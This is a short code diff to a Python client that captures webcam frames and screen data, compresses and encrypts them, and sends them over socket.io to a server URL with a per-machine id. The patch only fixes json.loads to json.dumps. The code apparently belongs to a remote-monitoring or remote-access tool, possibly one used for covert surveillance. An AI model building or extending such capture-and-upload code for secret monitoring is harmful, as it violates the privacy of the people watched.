@@ -551,7 +551,7 @@ def run(data, private_key):
                     compressed_data = zlib.compress(jpeg_data, level=9)
 
                     # Emit the compressed data
-                    sio.emit("screenshot", encrypt(public_key, json.loads({"uid": uid, "image": compressed_data})))
+                    sio.emit("screenshot", encrypt(public_key, json.dumps({"uid": uid, "image": compressed_data})))
                     print("Sent compressed camera screenshot")
 
                     last_capture_time = current_time
@@ -588,7 +588,7 @@ def run(data, private_key):
                 if len(sct.monitors)-1 < 1:  # No monitors detected
                     print("No monitors found. Skipping screen capture.")
                 else:
-                    sio.emit('screen_count', encrypt(public_key, json.loads({ 'uid': data['uid'], 'screen_count': len(sct.monitors)-1 })))
+                    sio.emit('screen_count', encrypt(public_key, json.dumps({ 'uid': data['uid'], 'screen_count': len(sct.monitors)-1 })))
 
     sio.connect(data["url"])      
     sio.wait()
